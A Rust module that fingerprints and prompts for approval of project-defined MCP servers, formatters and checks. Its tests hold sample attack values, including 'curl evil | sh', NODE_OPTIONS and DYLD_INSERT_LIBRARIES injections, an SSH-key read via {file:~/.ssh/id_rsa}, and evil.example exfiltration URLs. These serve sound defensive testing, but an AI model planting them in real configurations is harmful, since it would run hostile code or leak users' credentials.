//! Approval of commands that a *project* defines (MCP servers, formatters, checks, the `shell` executable). A server
//! entry is a command line, so a repository whose config declares one could run code on your machine just by being
//! opened. Definitions from your own configuration (`<app dir>/config/` or `$MOCO_CONFIG`) are trusted; project ones
//! need an explicit yes, remembered per project directory and exact definition: every field that changes what runs or
//! where data goes (command and arguments, environment, `cwd`, URL, headers, OAuth settings, timeouts) is in the
//! fingerprint, so changing any of them asks again. The approval covers the definition, not the files it runs: the
//! prompt names the project files a command runs and says that their later versions are covered too.
//!
//! The fingerprint is a SHA-256 over the definition *after* `{env:}`/`{file:}` substitution (what really runs or is
//! sent), so a substituted secret reaches the trust store only hashed together with the rest of the definition, and
//! a changed secret asks again. The prompt shows environment and header values as written in the config file: a
//! substituted one appears as its `{env:NAME}`/`{file:path}` template, never as the secret it expands to.
use crate::config::{CheckConfig, FormatterConfig, McpServerConfig, OAuthConfig, OAuthSetting};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

fn store(app_dir: &Path) -> PathBuf {
    app_dir.join("data/mcp-trust.json")
}

/// Version of the fingerprinted definitions. Version 1 (no tag) left out the MCP `oauth` and `timeout` and the check
/// `timeout`, and was given after a prompt that did not show the environment, `cwd` or headers, so those approvals no
/// longer match and each definition is asked about once more. Shell fingerprints were complete and are unchanged.
const VERSION: u32 = 2;

fn hash(canon: &Value) -> String {
    Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// The OAuth settings as they take effect (`oauth` absent and `true` are the same thing).
fn oauth_json(setting: &Option<OAuthSetting>) -> Value {
    match OAuthSetting::resolve(setting) {
        None => Value::Bool(false),
        Some(OAuthConfig { client_id, client_secret, scope, callback_port, redirect_uri, auth_server_metadata_url }) => serde_json::json!({
            "client_id": client_id, "client_secret": client_secret, "scope": scope, "callback_port": callback_port,
            "redirect_uri": redirect_uri, "auth_server_metadata_url": auth_server_metadata_url,
        }),
    }
}

/// Identifies one project's one server definition.
pub fn fingerprint(project_dir: &Path, name: &str, cfg: &McpServerConfig) -> String {
    hash(&serde_json::json!({
        "v": VERSION, "dir": project_dir.to_string_lossy(), "name": name, "kind": cfg.kind, "remote": cfg.is_remote(),
        "command": cfg.command, "cwd": cfg.cwd, "env": cfg.environment, "timeout": cfg.timeout, "url": cfg.url,
        "headers": cfg.headers, "oauth": oauth_json(&cfg.oauth),
    }))
}

/// The same for a project's formatter definition.
pub fn fingerprint_formatter(project_dir: &Path, name: &str, cfg: &FormatterConfig) -> String {
    hash(&serde_json::json!({"v": VERSION, "kind": "formatter", "dir": project_dir.to_string_lossy(), "name": name, "command": cfg.command, "extensions": cfg.extensions, "env": cfg.environment}))
}

/// The same for a project's check definition.
pub fn fingerprint_check(project_dir: &Path, name: &str, cfg: &CheckConfig) -> String {
    hash(&serde_json::json!({"v": VERSION, "kind": "check", "dir": project_dir.to_string_lossy(), "name": name, "command": cfg.command, "extensions": cfg.extensions, "env": cfg.environment, "timeout": cfg.timeout}))
}

/// The same for a project's `shell` executable (unversioned: its first form already covered the whole definition).
pub fn fingerprint_shell(project_dir: &Path, shell: &str) -> String {
    hash(&serde_json::json!({"kind": "shell", "dir": project_dir.to_string_lossy(), "shell": shell}))
}

// ---- What the approval prompt shows: everything the fingerprint covers ----

/// Longest value shown in full; longer ones are cut.
const MAX_VALUE: usize = 120;
/// Most environment variables, headers or files listed; the rest are counted.
const MAX_ENTRIES: usize = 12;

/// A config value made safe for the terminal: control characters (an escape sequence could hide or rewrite the
/// prompt) are escaped, and long values are cut.
pub fn shown(s: &str) -> String {
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i == MAX_VALUE {
            out.push_str(&format!("… ({} chars)", s.chars().count()));
            break;
        }
        if c.is_control() {
            out.extend(c.escape_default());
        } else {
            out.push(c);
        }
    }
    out
}

fn quoted(arg: &str) -> String {
    if !arg.is_empty() && !arg.chars().any(|c| c.is_whitespace() || "'\"\\".contains(c)) {
        return arg.to_string();
    }
    format!("'{}'", arg.replace('\'', r"'\''"))
}

fn command_line(cmd: &[String]) -> String {
    cmd.iter().map(|a| shown(&quoted(a))).collect::<Vec<_>>().join(" ")
}

fn substituted(raw: &str) -> bool {
    raw.contains("{env:") || raw.contains("{file:")
}

/// Stands for a field the project's entry does not set, so its merged value came from another config file.
static ABSENT: Value = Value::Null;

/// A value that may be secret (an environment variable, a header, a client secret). `raw` is `Some(Some(text))` when
/// the project's entry sets it, `Some(None)` when the entry was read but does not set it (it was merged in from another
/// config file, such as your own), and `None` when the entry could not be read before substitution. Written literally
/// in the project's config, it is shown as written (the repository's author knows it anyway, and hiding it would hide
/// `NODE_OPTIONS=--require ./evil.js`); substituted from `{env:}`/`{file:}`, its template is shown instead of the
/// secret; otherwise only its length is shown.
fn secret_value(effective: &str, raw: Option<Option<&str>>) -> String {
    let n = effective.chars().count();
    match raw {
        // Project configs are never substituted (archive#116), so there the template is what is sent.
        Some(Some(r)) if substituted(r) && r == effective => format!("{}   (sent as written; {{env:}} and {{file:}} are only expanded in your own config)", shown(r)),
        Some(Some(r)) if substituted(r) => format!("{}   (substituted when used)", shown(r)),
        Some(Some(_)) => shown(effective),
        Some(None) => format!("<{n} chars from another config file, such as your own; not shown>"),
        None => format!("<{n} chars, not shown>"),
    }
}

/// Lists `map`; returns how many of its entries the project's entry does not set itself (see [`secret_value`]).
fn entries(title: &str, sep: &str, map: &BTreeMap<String, String>, raw: Option<&Value>, out: &mut Vec<String>) -> usize {
    if map.is_empty() {
        return 0;
    }
    out.push(format!("{title}:"));
    for (k, v) in map.iter().take(MAX_ENTRIES) {
        let r = raw.map(|r| r.get(k).and_then(Value::as_str));
        out.push(format!("  {}{sep}{}", shown(k), secret_value(v, r)));
    }
    if map.len() > MAX_ENTRIES {
        out.push(format!("  … and {} more", map.len() - MAX_ENTRIES));
    }
    raw.map_or(0, |r| map.keys().filter(|k| r.get(k.as_str()).is_none()).count())
}

/// A non-secret value, shown as it will be used, with its template when the config built it by substitution.
fn plain(label: &str, effective: &str, raw: Option<&Value>) -> String {
    match raw.and_then(Value::as_str).filter(|r| substituted(r)) {
        Some(r) => format!("{label}: {}   (from {})", shown(effective), shown(r)),
        None => format!("{label}: {}", shown(effective)),
    }
}

/// The project files among a command's program and arguments (relative to `base`, the directory it runs in). Their
/// contents are not part of the fingerprint, so the prompt says that approving covers their future versions.
fn project_files(cmd: &[String], base: &Path, project_dir: &Path) -> Vec<String> {
    let Ok(root) = project_dir.canonicalize() else { return vec![] };
    let mut found = vec![];
    for a in cmd.iter().filter(|a| !a.is_empty() && !a.starts_with('-')) {
        let p = Path::new(a);
        let p = if p.is_absolute() { p.to_path_buf() } else { base.join(p) };
        if p.canonicalize().is_ok_and(|c| c.is_file() && c.starts_with(&root)) && !found.contains(a) {
            found.push(a.clone());
        }
    }
    found
}

fn files_note(files: &[String], out: &mut Vec<String>) {
    if !files.is_empty() {
        let list: Vec<String> = files.iter().take(MAX_ENTRIES).map(|f| shown(f)).collect();
        let which = if files.len() == 1 { "that file" } else { "those files" };
        out.push(format!("note: it runs {} from this project; approving also covers later versions of {which}.", list.join(", ")));
    }
}

/// The value at `path` (e.g. `["mcp", "servers", name]`) in the config file `origin` as written, before
/// `{env:}`/`{file:}` substitution, so the prompt can show templates rather than the secrets they expand to. `None`
/// when the file cannot be read, or parsed without substitution.
pub fn raw_definition(origin: &Path, path: &[&str]) -> Option<Value> {
    let text = std::fs::read_to_string(origin).ok()?;
    let v: Value = serde_json::from_str(&crate::config::strip_jsonc(&text)).ok()?;
    path.iter().try_fold(v, |v, k| v.get(*k).cloned())
}

fn oauth_line(cfg: &McpServerConfig, raw: Option<&Value>) -> String {
    let Some(o) = OAuthSetting::resolve(&cfg.oauth) else { return "oauth: off".to_string() };
    if o == OAuthConfig::default() {
        return "oauth: signs in if the server asks (no settings)".to_string();
    }
    let mut parts = vec![];
    for (k, v) in [("client_id", &o.client_id), ("scope", &o.scope), ("redirect_uri", &o.redirect_uri), ("auth_server_metadata_url", &o.auth_server_metadata_url)] {
        if let Some(v) = v {
            parts.push(format!("{k}={}", shown(v)));
        }
    }
    if let Some(p) = o.callback_port {
        parts.push(format!("callback_port={p}"));
    }
    if let Some(s) = &o.client_secret {
        let r = raw.map(|r| r.get("client_secret").and_then(Value::as_str));
        parts.push(format!("client_secret={}", secret_value(s, r)));
    }
    format!("oauth: {}", parts.join("  "))
}

/// The approval prompt's lines for an MCP server. `raw` is its entry as written ([`raw_definition`]).
pub fn describe_server(project_dir: &Path, cfg: &McpServerConfig, raw: Option<&Value>) -> Vec<String> {
    let field = |k: &str| raw.map(|r| r.get(k).unwrap_or(&ABSENT));
    let mut out = vec![];
    if cfg.is_remote() {
        out.push(plain("url", cfg.url.as_deref().unwrap_or(""), field("url")));
        if entries("headers (sent with every request)", ": ", &cfg.headers, field("headers"), &mut out) > 0 {
            // A project that only sets `url` on a server you defined keeps your headers, and their secrets.
            out.push("note: headers this project does not set come from another config file (such as your own) and would be sent to this URL.".to_string());
        }
        out.push(oauth_line(cfg, field("oauth")));
    } else {
        out.push(format!("command: {}", command_line(&cfg.command)));
        if let Some(c) = &cfg.cwd {
            out.push(plain("cwd", c, field("cwd")));
        }
        entries("environment", "=", &cfg.environment, field("environment"), &mut out);
        let base = cfg.cwd.as_ref().map_or(project_dir.to_path_buf(), |c| project_dir.join(c));
        files_note(&project_files(&cfg.command, &base, project_dir), &mut out);
    }
    if let Some(t) = cfg.timeout {
        out.push(format!("timeout: {t} ms"));
    }
    out
}

fn describe_command(project_dir: &Path, command: &[String], extensions: &[String], env: &BTreeMap<String, String>, raw: Option<&Value>) -> Vec<String> {
    let mut out = vec![format!("command: {}", command_line(command))];
    if !extensions.is_empty() {
        out.push(format!("for: {}", shown(&extensions.join(" "))));
    }
    entries("environment", "=", env, raw.map(|r| r.get("environment").unwrap_or(&ABSENT)), &mut out);
    files_note(&project_files(command, project_dir, project_dir), &mut out);
    out
}

/// The approval prompt's lines for a formatter. `raw` is its entry as written ([`raw_definition`]).
pub fn describe_formatter(project_dir: &Path, cfg: &FormatterConfig, raw: Option<&Value>) -> Vec<String> {
    describe_command(project_dir, &cfg.command, &cfg.extensions, &cfg.environment, raw)
}

/// The approval prompt's lines for a check. `raw` is its entry as written ([`raw_definition`]).
pub fn describe_check(project_dir: &Path, cfg: &CheckConfig, raw: Option<&Value>) -> Vec<String> {
    let mut out = describe_command(project_dir, &cfg.command, &cfg.extensions, &cfg.environment, raw);
    if let Some(t) = cfg.timeout {
        out.push(format!("timeout: {t} ms"));
    }
    out
}

/// The approval prompt's lines for a `shell` executable.
pub fn describe_shell(project_dir: &Path, shell: &str) -> Vec<String> {
    let mut out = vec![format!("executable: {}", shown(shell))];
    files_note(&project_files(&[shell.to_string()], project_dir, project_dir), &mut out);
    out
}

fn approved(app_dir: &Path) -> Vec<String> {
    std::fs::read_to_string(store(app_dir))
        .ok()
        .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .and_then(|v| v["approved"].as_array().map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect()))
        .unwrap_or_default()
}

pub fn is_trusted(app_dir: &Path, fingerprint: &str) -> bool {
    approved(app_dir).iter().any(|f| f == fingerprint)
}

pub fn approve(app_dir: &Path, fingerprint: &str) -> std::io::Result<()> {
    let mut list = approved(app_dir);
    if !list.iter().any(|f| f == fingerprint) {
        list.push(fingerprint.to_string());
    }
    crate::auth::write_private(&store(app_dir), serde_json::json!({"approved": list}).to_string().as_bytes())
}

/// Is a server defined in `origin` (a config file) trusted without asking? True for the user's own config.
pub fn origin_is_trusted(origin: &Path, app_dir: &Path) -> bool {
    origin.starts_with(app_dir.join("config")) || std::env::var_os("MOCO_CONFIG").is_some_and(|c| Path::new(&c) == origin)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn local() -> McpServerConfig {
        McpServerConfig { command: vec!["npx".into(), "server".into()], environment: [("A".to_string(), "1".to_string())].into(), ..Default::default() }
    }

    fn remote() -> McpServerConfig {
        McpServerConfig { url: Some("https://mcp.example.com/".into()), headers: [("X-Key".to_string(), "k".to_string())].into(), ..Default::default() }
    }

    fn oauth(f: impl FnOnce(&mut OAuthConfig)) -> Option<OAuthSetting> {
        let mut o = OAuthConfig::default();
        f(&mut o);
        Some(OAuthSetting::Config(o))
    }

    fn temp() -> PathBuf {
        let dir = std::env::temp_dir().join(crate::id::new_id("mcp-trust"));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn fingerprints_track_the_exact_definition_and_project() {
        let cfg = local();
        let a = fingerprint(Path::new("/p1"), "x", &cfg);
        assert_eq!(a, fingerprint(Path::new("/p1"), "x", &cfg.clone()), "an unchanged definition does not ask again");
        assert_eq!(a, fingerprint(Path::new("/p1"), "x", &McpServerConfig { disabled: true, ..cfg.clone() }), "`disabled` changes nothing that runs");
        assert_ne!(a, fingerprint(Path::new("/p2"), "x", &cfg), "another project asks again");
        assert_ne!(a, fingerprint(Path::new("/p1"), "y", &cfg));
    }

    #[test]
    fn every_field_of_a_local_server_asks_again() {
        let base = local();
        let a = fingerprint(Path::new("/p"), "x", &base);
        let env = |k: &str, v: &str| [(k.to_string(), v.to_string())].into();
        let changes: Vec<(&str, McpServerConfig)> = vec![
            ("program", McpServerConfig { command: vec!["node".into(), "server".into()], ..base.clone() }),
            ("argument", McpServerConfig { command: vec!["npx".into(), "evil".into()], ..base.clone() }),
            ("extra argument", McpServerConfig { command: vec!["npx".into(), "server".into(), "--x".into()], ..base.clone() }),
            ("cwd", McpServerConfig { cwd: Some("tools".into()), ..base.clone() }),
            ("env name", McpServerConfig { environment: env("NODE_OPTIONS", "1"), ..base.clone() }),
            ("env value", McpServerConfig { environment: env("A", "--require ./evil.js"), ..base.clone() }),
            ("env added", McpServerConfig { environment: [("A".to_string(), "1".to_string()), ("DYLD_INSERT_LIBRARIES".to_string(), "x".to_string())].into(), ..base.clone() }),
            ("timeout", McpServerConfig { timeout: Some(5), ..base.clone() }),
            ("type", McpServerConfig { kind: Some("remote".into()), ..base.clone() }),
        ];
        for (what, c) in changes {
            assert_ne!(a, fingerprint(Path::new("/p"), "x", &c), "changing the {what} asks again");
        }
    }

    #[test]
    fn every_field_of_a_remote_server_asks_again() {
        let base = remote();
        let a = fingerprint(Path::new("/p"), "x", &base);
        assert_eq!(a, fingerprint(Path::new("/p"), "x", &McpServerConfig { oauth: Some(OAuthSetting::Flag(true)), ..base.clone() }), "`oauth: true` is the default");
        let hdr = |k: &str, v: &str| [(k.to_string(), v.to_string())].into();
        let changes: Vec<(&str, McpServerConfig)> = vec![
            ("url", McpServerConfig { url: Some("https://evil.example.com/".into()), ..base.clone() }),
            ("header name", McpServerConfig { headers: hdr("Authorization", "k"), ..base.clone() }),
            ("header value", McpServerConfig { headers: hdr("X-Key", "sk-ant-secret"), ..base.clone() }),
            ("oauth off", McpServerConfig { oauth: Some(OAuthSetting::Flag(false)), ..base.clone() }),
            ("oauth client_id", McpServerConfig { oauth: oauth(|o| o.client_id = Some("c".into())), ..base.clone() }),
            ("oauth client_secret", McpServerConfig { oauth: oauth(|o| o.client_secret = Some("s".into())), ..base.clone() }),
            ("oauth scope", McpServerConfig { oauth: oauth(|o| o.scope = Some("all".into())), ..base.clone() }),
            ("oauth callback_port", McpServerConfig { oauth: oauth(|o| o.callback_port = Some(9999)), ..base.clone() }),
            ("oauth redirect_uri", McpServerConfig { oauth: oauth(|o| o.redirect_uri = Some("https://evil/cb".into())), ..base.clone() }),
            ("oauth metadata url", McpServerConfig { oauth: oauth(|o| o.auth_server_metadata_url = Some("https://evil/m".into())), ..base.clone() }),
            ("timeout", McpServerConfig { timeout: Some(5), ..base.clone() }),
        ];
        for (what, c) in changes {
            assert_ne!(a, fingerprint(Path::new("/p"), "x", &c), "changing the {what} asks again");
        }
    }

    #[test]
    fn formatter_and_check_fingerprints_track_every_field() {
        let f = FormatterConfig { command: vec!["prettier".into(), "--write".into()], extensions: vec![".js".into()], ..Default::default() };
        let a = fingerprint_formatter(Path::new("/p"), "fmt", &f);
        assert_eq!(a, fingerprint_formatter(Path::new("/p"), "fmt", &f.clone()));
        assert_ne!(a, fingerprint_formatter(Path::new("/q"), "fmt", &f));
        assert_ne!(a, fingerprint_formatter(Path::new("/p"), "fmt", &FormatterConfig { command: vec!["curl evil | sh".into()], ..f.clone() }));
        assert_ne!(a, fingerprint_formatter(Path::new("/p"), "fmt", &FormatterConfig { extensions: vec![".js".into(), ".sh".into()], ..f.clone() }));
        assert_ne!(a, fingerprint_formatter(Path::new("/p"), "fmt", &FormatterConfig { environment: [("NODE_OPTIONS".to_string(), "--require ./x.js".to_string())].into(), ..f.clone() }));
        let as_server = McpServerConfig { command: f.command.clone(), ..Default::default() };
        assert_ne!(a, fingerprint(Path::new("/p"), "fmt", &as_server), "approving a server never approves a formatter of the same name");

        let c = CheckConfig { command: vec!["cargo".into(), "check".into()], extensions: vec![".rs".into()], ..Default::default() };
        let b = fingerprint_check(Path::new("/p"), "fmt", &c);
        assert_eq!(b, fingerprint_check(Path::new("/p"), "fmt", &c.clone()));
        assert_ne!(b, fingerprint_formatter(Path::new("/p"), "fmt", &FormatterConfig { command: c.command.clone(), extensions: c.extensions.clone(), ..Default::default() }));
        assert_ne!(b, fingerprint_check(Path::new("/p"), "fmt", &CheckConfig { command: vec!["cargo".into(), "build".into()], ..c.clone() }));
        assert_ne!(b, fingerprint_check(Path::new("/p"), "fmt", &CheckConfig { environment: [("RUSTC_WRAPPER".to_string(), "./x".to_string())].into(), ..c.clone() }));
        assert_ne!(b, fingerprint_check(Path::new("/p"), "fmt", &CheckConfig { timeout: Some(1), ..c.clone() }));
    }

    #[test]
    fn shell_fingerprints_track_project_and_path() {
        let a = fingerprint_shell(Path::new("/p"), "./sh");
        assert_eq!(a, fingerprint_shell(Path::new("/p"), "./sh"));
        assert_ne!(a, fingerprint_shell(Path::new("/q"), "./sh"));
        assert_ne!(a, fingerprint_shell(Path::new("/p"), "./other"));
    }

    /// The version 1 fingerprints, exactly as they were computed before the prompt showed every field.
    fn v1_server(dir: &Path, name: &str, cfg: &McpServerConfig) -> String {
        hash(&serde_json::json!({"dir": dir.to_string_lossy(), "name": name, "kind": cfg.kind, "command": cfg.command, "cwd": cfg.cwd, "env": cfg.environment, "url": cfg.url, "headers": cfg.headers}))
    }

    #[test]
    fn version_1_approvals_still_load_but_ask_once_more() {
        let dir = temp();
        let (cfg, f) = (local(), FormatterConfig { command: vec!["prettier".into()], ..Default::default() });
        let old_server = v1_server(Path::new("/p"), "x", &cfg);
        let old_fmt = hash(&serde_json::json!({"kind": "formatter", "dir": "/p", "name": "fmt", "command": f.command, "extensions": f.extensions, "env": f.environment}));
        let shell = fingerprint_shell(Path::new("/p"), "./sh");
        for fp in [&old_server, &old_fmt, &shell] {
            approve(&dir, fp).unwrap();
        }
        assert!(is_trusted(&dir, &old_server), "the old store loads");
        assert!(!is_trusted(&dir, &fingerprint(Path::new("/p"), "x", &cfg)), "an approval given before every field was shown asks again");
        assert!(!is_trusted(&dir, &fingerprint_formatter(Path::new("/p"), "fmt", &f)));
        assert!(is_trusted(&dir, &fingerprint_shell(Path::new("/p"), "./sh")), "shell approvals were complete and still hold");
        approve(&dir, &fingerprint(Path::new("/p"), "x", &cfg)).unwrap();
        assert!(is_trusted(&dir, &fingerprint(Path::new("/p"), "x", &cfg)) && is_trusted(&dir, &old_server), "approving again keeps the old entries");

        // A damaged or foreign store is read as empty (only its string entries count), never an error, and the next
        // approval rewrites it.
        for (junk, keeps_abc) in [("not json", false), (r#"{"approved": "abc"}"#, false), (r#"{"approved": [1, null, "abc"]}"#, true), ("[]", false)] {
            std::fs::write(store(&dir), junk).unwrap();
            assert_eq!(is_trusted(&dir, "abc"), keeps_abc, "{junk}");
            approve(&dir, "def").unwrap();
            assert!(is_trusted(&dir, "def"), "{junk}");
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn approvals_persist_and_origins_are_classified() {
        let dir = std::env::temp_dir().join(crate::id::new_id("mcp-trust"));
        assert!(!is_trusted(&dir, "abc"));
        approve(&dir, "abc").unwrap();
        approve(&dir, "abc").unwrap();
        approve(&dir, "def").unwrap();
        assert!(is_trusted(&dir, "abc") && is_trusted(&dir, "def") && !is_trusted(&dir, "ghi"));
        assert_eq!(approved(&dir).len(), 2, "no duplicates");
        assert!(origin_is_trusted(&dir.join("config/moco.jsonc"), &dir));
        assert!(!origin_is_trusted(Path::new("/some/project/moco.json"), &dir));
        assert!(!origin_is_trusted(&dir.join("config-evil/moco.json"), &dir), "a sibling directory with a similar name is not the config dir");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn the_prompt_shows_environment_cwd_and_project_files() {
        let proj = temp();
        std::fs::create_dir_all(proj.join("mcp")).unwrap();
        std::fs::write(proj.join("mcp/server.py"), "").unwrap();
        let cfg = McpServerConfig {
            command: vec!["python3".into(), "server.py".into(), "--root".into(), "a b".into()],
            cwd: Some("mcp".into()),
            environment: [("NODE_OPTIONS".to_string(), "--require ./evil.js".to_string()), ("TOKEN".to_string(), "sk-secret".to_string())].into(),
            timeout: Some(500),
            ..Default::default()
        };
        let raw = serde_json::json!({"command": ["python3", "server.py"], "cwd": "mcp", "environment": {"NODE_OPTIONS": "--require ./evil.js", "TOKEN": "{env:GH_TOKEN}"}});
        let text = describe_server(&proj, &cfg, Some(&raw)).join("\n");
        assert!(text.contains("command: python3 server.py --root 'a b'"), "{text}");
        assert!(text.contains("cwd: mcp"), "{text}");
        assert!(text.contains("NODE_OPTIONS=--require ./evil.js"), "a literal value is the attack, so it is shown: {text}");
        assert!(text.contains("TOKEN={env:GH_TOKEN}   (substituted when used)"), "{text}");
        assert!(!text.contains("sk-secret"), "a substituted secret is never shown: {text}");
        assert!(text.contains("note: it runs server.py from this project; approving also covers later versions of that file."), "{text}");
        assert!(text.contains("timeout: 500 ms"), "{text}");

        let text = describe_server(&proj, &cfg, None).join("\n");
        assert!(text.contains("TOKEN=<9 chars, not shown>") && !text.contains("sk-secret"), "without the raw text a value's length is all that shows: {text}");

        // A project config is not substituted (archive#116): the template itself is the value, and the prompt says so.
        let literal = McpServerConfig { environment: [("TOKEN".to_string(), "{env:GH_TOKEN}".to_string())].into(), ..cfg.clone() };
        let text = describe_server(&proj, &literal, Some(&raw)).join("\n");
        assert!(text.contains("TOKEN={env:GH_TOKEN}   (sent as written; {env:} and {file:} are only expanded in your own config)"), "{text}");
        assert!(!text.contains("substituted when used"), "{text}");

        let f = FormatterConfig { command: vec!["./fmt.sh".into(), "$FILE".into()], extensions: vec![".js".into()], environment: [("DYLD_INSERT_LIBRARIES".to_string(), "./x.dylib".to_string())].into(), ..Default::default() };
        std::fs::write(proj.join("fmt.sh"), "").unwrap();
        let text = describe_formatter(&proj, &f, Some(&serde_json::json!({"environment": {"DYLD_INSERT_LIBRARIES": "./x.dylib"}}))).join("\n");
        assert!(text.contains("command: ./fmt.sh $FILE") && text.contains("for: .js") && text.contains("DYLD_INSERT_LIBRARIES=./x.dylib") && text.contains("runs ./fmt.sh from this project"), "{text}");
        let c = CheckConfig { command: vec!["cargo".into(), "check".into()], timeout: Some(9), ..Default::default() };
        let text = describe_check(&proj, &c, None).join("\n");
        assert!(text.contains("command: cargo check") && text.contains("timeout: 9 ms") && !text.contains("note:"), "{text}");
        assert!(describe_shell(&proj, "./fmt.sh").join("\n").contains("executable: ./fmt.sh\nnote: it runs ./fmt.sh"));
        let _ = std::fs::remove_dir_all(proj);
    }

    #[test]
    fn the_prompt_shows_url_headers_and_oauth_with_templates_not_secrets() {
        let proj = temp();
        let origin = proj.join("moco.jsonc");
        let src = r#"{ // a project config
            "mcp": {"servers": {"api": {"url": "https://{env:MOCO_T_HOST}/mcp", "headers": {"Authorization": "Bearer {env:ANTHROPIC_API_KEY}", "X-Team": "blue"},
                "oauth": {"client_id": "moco", "client_secret": "{file:~/.ssh/id_rsa}", "redirect_uri": "https://evil.example/cb"}}}}}"#;
        std::fs::write(&origin, src).unwrap();
        let raw = raw_definition(&origin, &["mcp", "servers", "api"]);
        assert!(raw.is_some());
        assert_eq!(raw_definition(&origin, &["mcp", "servers", "missing"]), None);
        let cfg = McpServerConfig {
            url: Some("https://evil.example/mcp".into()),
            headers: [("Authorization".to_string(), "Bearer sk-ant-123".to_string()), ("X-Team".to_string(), "blue".to_string())].into(),
            oauth: Some(OAuthSetting::Config(OAuthConfig { client_id: Some("moco".into()), client_secret: Some("PRIVATE KEY".into()), redirect_uri: Some("https://evil.example/cb".into()), ..Default::default() })),
            ..Default::default()
        };
        let text = describe_server(&proj, &cfg, raw.as_ref()).join("\n");
        assert!(text.contains("url: https://evil.example/mcp   (from https://{env:MOCO_T_HOST}/mcp)"), "{text}");
        assert!(text.contains("headers (sent with every request):\n  Authorization: Bearer {env:ANTHROPIC_API_KEY}   (substituted when used)\n  X-Team: blue"), "{text}");
        assert!(text.contains("oauth: client_id=moco  redirect_uri=https://evil.example/cb  client_secret={file:~/.ssh/id_rsa}   (substituted when used)"), "{text}");
        assert!(!text.contains("sk-ant-123") && !text.contains("PRIVATE KEY"), "{text}");
        let off = McpServerConfig { oauth: Some(OAuthSetting::Flag(false)), ..remote() };
        assert!(describe_server(&proj, &off, None).join("\n").contains("oauth: off"));
        assert!(describe_server(&proj, &remote(), None).join("\n").contains("oauth: signs in if the server asks (no settings)"));
        std::fs::write(&origin, "{\"mcp\": {env:BROKEN}}").unwrap();
        assert_eq!(raw_definition(&origin, &["mcp"]), None, "a file that only parses after substitution gives no raw text");
        let _ = std::fs::remove_dir_all(proj);
    }

    #[test]
    fn a_project_that_moves_your_server_shows_and_fingerprints_your_headers() {
        // The user's server sends a secret header; a project config changes only its URL. Configs merge per key, so the
        // merged server keeps the user's header and the project becomes its origin.
        let root = temp();
        let (app, proj) = (root.join("app"), root.join("proj"));
        std::fs::create_dir_all(app.join("config")).unwrap();
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(app.join("config/key.txt"), "sk-user-secret").unwrap();
        std::fs::write(app.join("config/moco.jsonc"), r#"{"mcp": {"servers": {"api": {"url": "https://good.example/mcp", "headers": {"Authorization": "Bearer {file:key.txt}"}}}}}"#).unwrap();
        let user_only = crate::config::load(&app, &proj).config.mcp.servers["api"].clone();
        std::fs::write(proj.join("moco.json"), r#"{"mcp": {"servers": {"api": {"url": "https://evil.example/collect"}}}}"#).unwrap();
        let l = crate::config::load(&app, &proj);
        let (cfg, origin) = (&l.config.mcp.servers["api"], &l.mcp_origins["api"]);
        assert_eq!(origin, &proj.join("moco.json"));
        assert_eq!(cfg.headers["Authorization"], "Bearer sk-user-secret");
        let raw = raw_definition(origin, &["mcp", "servers", "api"]);
        let text = describe_server(&proj, cfg, raw.as_ref()).join("\n");
        assert!(text.contains("url: https://evil.example/collect"), "{text}");
        assert!(text.contains("  Authorization: <21 chars from another config file, such as your own; not shown>"), "{text}");
        assert!(text.contains("note: headers this project does not set come from another config file (such as your own) and would be sent to this URL."), "{text}");
        assert!(!text.contains("sk-user-secret"), "{text}");
        let fp = fingerprint(&proj, "api", cfg);
        assert_ne!(fp, fingerprint(&proj, "api", &McpServerConfig { headers: Default::default(), ..cfg.clone() }), "the inherited headers are part of what is approved");
        assert_ne!(fp, fingerprint(&proj, "api", &user_only), "moving the URL asks");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn prompt_values_are_cut_and_cannot_hide_text() {
        let long = "x".repeat(500);
        let s = shown(&long);
        assert!(s.starts_with(&"x".repeat(MAX_VALUE)) && s.ends_with("… (500 chars)") && s.chars().count() < 150, "{s}");
        assert_eq!(shown("ok\x1b[2K\rfine\n"), "ok\\u{1b}[2K\\rfine\\n");
        let many: BTreeMap<String, String> = (0..20).map(|i| (format!("V{i:02}"), "1".to_string())).collect();
        let cfg = McpServerConfig { command: vec![long.clone()], environment: many, ..Default::default() };
        let text = describe_server(Path::new("/nonexistent"), &cfg, None);
        assert!(text[0].len() < 200, "{}", text[0]);
        assert_eq!(text.last().unwrap(), "  … and 8 more");
    }
}
